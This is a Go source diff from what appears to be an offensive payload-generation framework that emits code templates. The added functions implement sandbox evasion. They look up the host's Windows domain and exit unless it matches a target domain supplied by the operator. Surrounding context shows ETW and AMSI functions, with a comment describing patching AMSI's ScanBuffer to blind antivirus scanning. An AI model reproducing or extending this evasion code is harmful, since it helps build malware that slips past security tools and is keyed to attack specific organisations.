@@ -18,6 +18,35 @@ func Sandbox() string {
 	`
 }
 
+//TODO newly added function should return the domain of the call
+//syscall.UTF16PtrFromString
+func Sandbox_DomainSpecific() string {
+	return `
+	func {{.Variables.IsDomainJoined}}() (string, error) {
+		var {{.Variables.domain}} *uint16
+		var {{.Variables.status}} uint32
+		err := syscall.NetGetJoinInformation(nil, &{{.Variables.domain}}, &{{.Variables.status}})
+		if err != nil {
+			return "", err
+		}
+		domainresult := windows.UTF16PtrToString({{.Variables.domain}})
+		syscall.NetApiBufferFree((*byte)(unsafe.Pointer({{.Variables.domain}})))
+		return domainresult, nil
+	}
+	`
+}
+
+//TODO newly added function should call the domainjoined function and then compare it against the argument given by user.
+func Sandbox_DomainSpecificJoined() string {
+	return `
+	var {{.Variables.domainresult}} string
+		{{.Variables.domainresult}}, _ = {{.Variables.IsDomainJoined}}()
+	if "{{.Variables.sandboxdomain}}" == {{.Variables.domainresult}} {
+	} else {
+		os.Exit(3)
+	}`
+}
+
 func Sandbox_DomainJoined() string {
 	return `
 	var {{.Variables.checker}} bool
@@ -874,6 +903,7 @@ func ETW_Function() string {
 `
 }
 
+//TODO - Patch AMSI - loads amsi dll searches for scanbuffer and wrecks it. Could be flagged.
 func AMSI_Function() string {
 	return `
 	func {{.Variables.AMSI}}() {
